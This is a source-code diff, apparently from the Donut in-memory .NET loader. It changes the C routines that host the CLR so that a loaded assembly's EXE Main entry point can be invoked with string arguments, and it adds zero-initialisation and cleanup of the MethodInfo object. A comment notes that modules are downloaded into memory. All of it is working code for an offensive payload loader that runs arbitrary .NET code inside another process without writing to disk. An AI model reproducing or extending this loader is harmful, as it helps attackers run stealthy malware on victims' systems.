@@ -42,6 +42,8 @@ DWORD ThreadProc(LPVOID lpParameter) {
     PDONUT_INSTANCE inst = (PDONUT_INSTANCE)lpParameter;
     DONUT_ASSEMBLY  assembly;
     
+    Memset((PBYTE)&assembly, 0, sizeof(assembly));
+    
 #if !defined(NOCRYPTO)
     PBYTE           inst_data;
     // load pointer to data just past len + key
@@ -117,10 +119,6 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
       mod = inst->module.p;
     }
 
-    pa->icrh = NULL;
-    pa->icri = NULL;
-    pa->icmh = NULL;
-    
     if(inst->api.CLRCreateInstance != NULL) {
       DPRINT("CLRCreateInstance");
       
@@ -128,9 +126,7 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
        (REFCLSID)&inst->xCLSID_CLRMetaHost, 
        (REFIID)&inst->xIID_ICLRMetaHost, 
        (LPVOID*)&pa->icmh);
-       
-       DPRINT("HRESULT: %08lx", hr);
-       
+      
       if(SUCCEEDED(hr)) {
         DPRINT("ICLRMetaHost::GetRuntime");
       
@@ -225,12 +221,14 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
 }
     
 BOOL RunAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
-    SAFEARRAY     *sav;
-    VARIANT       arg, ret, vt={0};
+    SAFEARRAY     *sav=NULL, params;
+    VARIANT       arg, ret, vtPsa, v1={0}, v2;
     DWORD         i;
     PDONUT_MODULE mod;
     HRESULT       hr;
     BSTR          cls, method;
+    ULONG         cnt;
+    OLECHAR       str[1]={0};
     
     if(inst->type == DONUT_INSTANCE_PIC) {
       DPRINT("Using module embedded in instance");
@@ -240,67 +238,131 @@ BOOL RunAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
       mod = inst->module.p;
     }
     
-    cls = inst->api.SysAllocString(mod->cls);
-    if(cls == NULL) return FALSE;
+    DPRINT("Type is %s", 
+      mod->type == DONUT_MODULE_DLL ? "DLL" : "EXE");
     
-    method = inst->api.SysAllocString(mod->method);
-    
-    if(method != NULL) {
-      DPRINT("Assembly::GetType_2");
-      hr = pa->as->lpVtbl->GetType_2(pa->as, cls, &pa->type);
+    // if this is a program
+    if(mod->type == DONUT_MODULE_EXE) {
+      // get the entrypoint
+      DPRINT("MethodInfo::EntryPoint");
+      hr = pa->as->lpVtbl->EntryPoint(pa->as, &pa->mi);
       
       if(SUCCEEDED(hr)) {
-        sav = NULL;
-        if(mod->param_cnt != 0) {
-          DPRINT("SafeArrayCreateVector(%li parameter(s))", mod->param_cnt);
-          
-          sav = inst->api.SafeArrayCreateVector(
-            VT_VARIANT, 0, mod->param_cnt);
-        
-          if(sav != NULL) {
-            for(i=0; i<mod->param_cnt; i++) {
-              DPRINT("Adding \"%ws\" as parameter %i", mod->param[i], (i+1));
-              
-              V_BSTR(&arg) = inst->api.SysAllocString(mod->param[i]);
-              V_VT(&arg)   = VT_BSTR;
-              
-              hr = inst->api.SafeArrayPutElement(sav, &i, &arg);
-              
-              if(FAILED(hr)) {
-                DPRINT("SafeArrayPutElement failed.");
-                inst->api.SafeArrayDestroy(sav);
-                sav = NULL;
-              }
-            }
-          }
-        }
+        // get the parameters for entrypoint
+        DPRINT("MethodInfo::GetParameters");
+        hr = pa->mi->lpVtbl->GetParameters(pa->mi, &params);
         if(SUCCEEDED(hr)) {
-          DPRINT("Calling Type::InvokeMember_3");
+          DPRINT("cbElements = %li", params.cbElements);
+          // does Main require string[] args?
+          if(params.cbElements != 0) {
+            // create a 1 dimensional array for Main parameters
+            sav = inst->api.SafeArrayCreateVector(VT_VARIANT, 0, 1);
+            // if user specified their own parameters, add to string array
+            if(mod->param_cnt != 0) {
+              // create 1 dimensional array for strings[] args
+              vtPsa.vt     = (VT_ARRAY | VT_BSTR);
+              vtPsa.parray = inst->api.SafeArrayCreateVector(VT_BSTR, 0, mod->param_cnt);
+              
+              // add each string parameter
+              for(i=0; i<mod->param_cnt; i++) {
+                DPRINT("Adding \"%ws\" as parameter %i", mod->param[i], (i + 1));
+                
+                inst->api.SafeArrayPutElement(vtPsa.parray, 
+                    &i, inst->api.SysAllocString(mod->param[i]));
+              }
+            } else {
+              // add empty string to make it work
+              // create 1 dimensional array for strings[] args
+              vtPsa.vt     = (VT_ARRAY | VT_BSTR);
+              vtPsa.parray = inst->api.SafeArrayCreateVector(VT_BSTR, 0, 1);
+              
+              i=0;
+              inst->api.SafeArrayPutElement(vtPsa.parray, 
+                    &i, inst->api.SysAllocString(str));
+            }
+            // add string array to list of parameters
+            i=0;
+            inst->api.SafeArrayPutElement(sav, &i, &vtPsa);
+          }
+          v1.vt    = VT_NULL;
+          v1.plVal = NULL;
           
-          hr = pa->type->lpVtbl->InvokeMember_3(
-              pa->type, 
-              method,   // name of method 
-              BindingFlags_InvokeMethod | 
-              BindingFlags_Static       | 
-              BindingFlags_Public,
-              NULL, 
-              vt,       // empty VARIANT
-              sav,      // arguments to method
-              &ret);    // return code from method
-                       
-          DPRINT("InvokeMember_3 : %08lx : %s", 
+          DPRINT("MethodInfo::Invoke_3()\n");
+          
+          hr = pa->mi->lpVtbl->Invoke_3(pa->mi, v1, sav, &v2);
+          
+          DPRINT("MethodInfo::Invoke_3 : %08lx : %s", 
             hr, SUCCEEDED(hr) ? "Success" : "Failed");
             
           if(sav != NULL) {
+            inst->api.SafeArrayDestroy(vtPsa.parray);
             inst->api.SafeArrayDestroy(sav);
           }
         }
+      } else pa->mi = NULL;
+    } else {
+      DPRINT("SysAllocString(\"%ws\")", mod->cls);
+      cls = inst->api.SysAllocString(mod->cls);
+      if(cls == NULL) return FALSE;
+    
+      DPRINT("SysAllocString(\"%ws\")", mod->method);
+      method = inst->api.SysAllocString(mod->method);
+    
+      if(method != NULL) {
+        DPRINT("Assembly::GetType_2");
+        hr = pa->as->lpVtbl->GetType_2(pa->as, cls, &pa->type);
+        
+        if(SUCCEEDED(hr)) {
+          sav = NULL;
+          if(mod->param_cnt != 0) {
+            DPRINT("SafeArrayCreateVector(%li parameter(s))", mod->param_cnt);
+            
+            sav = inst->api.SafeArrayCreateVector(
+              VT_VARIANT, 0, mod->param_cnt);
+          
+            if(sav != NULL) {
+              for(i=0; i<mod->param_cnt; i++) {
+                DPRINT("Adding \"%ws\" as parameter %i", mod->param[i], (i+1));
+                
+                V_BSTR(&arg) = inst->api.SysAllocString(mod->param[i]);
+                V_VT(&arg)   = VT_BSTR;
+                
+                hr = inst->api.SafeArrayPutElement(sav, &i, &arg);
+                
+                if(FAILED(hr)) {
+                  DPRINT("SafeArrayPutElement failed.");
+                  inst->api.SafeArrayDestroy(sav);
+                  sav = NULL;
+                }
+              }
+            }
+          }
+          if(SUCCEEDED(hr)) {
+            DPRINT("Calling Type::InvokeMember_3");
+            
+            hr = pa->type->lpVtbl->InvokeMember_3(
+                pa->type, 
+                method,   // name of method 
+                BindingFlags_InvokeMethod | 
+                BindingFlags_Static       | 
+                BindingFlags_Public,
+                NULL, 
+                v1,       // empty VARIANT
+                sav,      // arguments to method
+                &ret);    // return code from method
+                         
+            DPRINT("Type::InvokeMember_3 : %08lx : %s", 
+              hr, SUCCEEDED(hr) ? "Success" : "Failed");
+              
+            if(sav != NULL) {
+              inst->api.SafeArrayDestroy(sav);
+            }
+          }
+        }
+        inst->api.SysFreeString(method);
       }
-      inst->api.SysFreeString(method);
+      inst->api.SysFreeString(cls);
     }
-    
-    inst->api.SysFreeString(cls);
-    
     return TRUE;
 }
   
@@ -323,6 +385,12 @@ VOID FreeAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
       pa->type = NULL;
     }
 
+    if(pa->mi != NULL) {
+      DPRINT("MethodInfo::Release");
+      pa->mi->lpVtbl->Release(pa->mi);
+      pa->mi = NULL;
+    }
+    
     if(pa->as != NULL) {
       DPRINT("Assembly::Release");
       pa->as->lpVtbl->Release(pa->as);
@@ -369,7 +437,7 @@ VOID FreeAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
   Module is downloaded into memory and should be released after loading with VirtualFree.
   Returns TRUE on success, else FALSE
   
-  If TRUE, inst->assembly.p will point to donut_encrypted PDONUT_MODULE
+  If TRUE, inst->assembly.p will point to encrypted PDONUT_MODULE
 */
 BOOL DownloadModule(PDONUT_INSTANCE inst) {
     HINTERNET       hin, con, req;
